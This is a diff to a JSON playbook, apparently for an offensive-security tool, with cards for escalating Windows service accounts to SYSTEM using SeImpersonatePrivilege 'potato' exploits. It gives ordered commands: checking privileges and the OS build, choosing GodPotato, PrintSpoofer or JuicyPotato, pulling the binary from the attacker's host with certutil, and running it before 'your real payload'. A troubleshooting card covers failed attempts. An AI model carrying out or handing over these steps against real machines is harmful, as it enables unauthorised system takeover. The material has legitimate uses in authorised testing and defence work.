@@ -60,7 +60,7 @@
     {
       "id": "seimpersonate",
       "title": "SeImpersonatePrivilege (Potato Family)",
-      "hypothesis": "Service identities such as IIS or MSSQL nearly always carry SeImpersonatePrivilege, which allows them to grab a SYSTEM authentication and impersonate it, that is the whole potato lineage (GodPotato on current Windows, PrintSpoofer, JuicyPotato on legacy builds). Verify the preconditions before you begin: SeImpersonate is present, the .NET version is high enough, the target is x64, and you have a writable directory to stage from.",
+      "hypothesis": "Service identities (IIS, MSSQL) nearly always carry SeImpersonatePrivilege, which lets them grab and impersonate a SYSTEM token — the whole potato lineage. The key to not wasting a run: MATCH THE POTATO TO THE WINDOWS BUILD UP FRONT. The wrong potato for the build fails with a cryptic \"the handle is invalid\", so read the build first and pick deliberately — GodPotato for Server 2012-2022 and Win8-11, PrintSpoofer when the spooler/named-pipe path is up (2016/2019/Win10), JuicyPotato only on legacy builds. Confirm the preconditions too: SeImpersonate present, x64, a writable staging dir.",
       "tool": "godpotato",
       "tools": [
         "godpotato"
@@ -94,17 +94,22 @@
         {
           "tool": "sh",
           "run": "whoami /priv | findstr /i impersonate",
-          "note": "Make sure SeImpersonatePrivilege is actually present before doing anything else."
+          "note": "PRECONDITION: confirm SeImpersonatePrivilege (or SeAssignPrimaryToken) is actually present before anything else."
+        },
+        {
+          "tool": "sh",
+          "run": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
+          "note": "MATCH THE BUILD FIRST (this prevents the failure): Server 2012/2016/2019/2022 or Win8-11 -> GodPotato (broadest, most reliable). Spooler/named-pipe reachable on 2016/2019/Win10 -> PrintSpoofer. Only a legacy build (2008/2012, Win7) with the old COM path -> JuicyPotato. Picking the wrong one is what throws \"the handle is invalid\"."
         },
         {
           "tool": "sh",
           "run": "certutil -urlcache -f http://{{lhost}}:8000/GodPotato-NET4.exe gp.exe",
-          "note": "Drop the binary you picked (served from your machine). GodPotato handles Win10/11 and Server 2012 and up; reach for JuicyPotato on older targets."
+          "note": "Drop the potato you chose for the build (served from your box). GodPotato is the safe default across modern Windows; substitute PrintSpoofer.exe / JuicyPotatoNG.exe if the build pointed you there."
         },
         {
           "tool": "sh",
-          "run": "gp.exe -cmd \"cmd /c whoami > C:\\Windows\\Temp\\proof.txt\"",
-          "note": "Demonstrate SYSTEM with a harmless write first, read the file back to confirm, and only then fire your actual payload/reverse command."
+          "run": "gp.exe -cmd \"cmd /c whoami > C:\\\\Windows\\\\Temp\\\\proof.txt\"",
+          "note": "Prove SYSTEM with a harmless write first, read it back, then fire your real payload. If it still errors here, the potato-troubleshoot card catches the build-mismatch case."
         }
       ]
     },
@@ -127,7 +132,7 @@
         "advice.potato"
       ],
       "priority": 70,
-      "hypothesis": "A SeImpersonate potato that errors (\"the handle is invalid\", a CoGetInstanceFromIStorage failure) is the wrong potato for this Windows build, not a dead end — the privilege is still there. Match the technique to the version: PrintSpoofer/GodPotato for 2019/2022 and Win10+, JuicyPotato only on older builds. One of them lands SYSTEM.",
+      "hypothesis": "A SeImpersonate potato that errors (\"the handle is invalid\", a CoGetInstanceFromIStorage failure) is the wrong potato for this build — NOT a dead end, the privilege is still yours. Best practice is to match the build up front (see the SeImpersonate card); this card is the recovery when it failed anyway. Re-pick by version: GodPotato/PrintSpoofer for 2016/2019/2022 and Win10+, JuicyPotato only on older builds. One of them lands SYSTEM.",
       "proves": "nothing new; it points you at the potato that works on this build",
       "does_not_prove": "that you lack the privilege — SeImpersonate/SeAssignPrimaryToken is what makes any of these work",
       "report": {
